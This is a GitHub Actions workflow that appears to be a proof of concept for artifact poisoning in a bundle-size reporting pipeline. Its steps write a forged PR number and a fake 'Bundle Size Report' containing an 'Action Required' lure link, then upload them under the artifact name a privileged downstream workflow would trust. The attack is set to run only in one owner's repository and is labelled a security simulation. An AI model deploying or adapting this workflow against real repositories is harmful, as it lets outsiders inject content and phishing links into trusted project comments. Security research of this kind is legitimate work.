name: Bundle size
on:
  pull_request:

jobs:
  bundle-size:
    if: ${{ github.repository_owner == 'N372unn32' }}
    runs-on: ubuntu-latest
    permissions:
      contents: read
      actions: read
    steps:
      - name: Create poisoned PR number
        run: echo "1" > pr.txt

      - name: Create poisoned bundle report
        run: |
          cat > monosize-report.md << 'REPORT'
          ## Bundle Size Report

          | Package | Before | After | Diff |
          |---------|--------|-------|------|
          | @fluentui/react-components | 142.5 kB | 142.8 kB | +0.3 kB |
          | @fluentui/react-icons | 28.1 kB | 28.1 kB | 0 |

          ### Action Required

          Bundle size increase detected. Please review the detailed analysis:

          [View detailed bundle analysis](https://example.com)

          ---
          *Report generated by Fluent UI bundle size automation - security simulation - ignore.*
          REPORT

      - name: Upload poisoned artifact
        uses: actions/upload-artifact@v4
        with:
          name: monosize-report
          path: |
            pr.txt
            monosize-report.md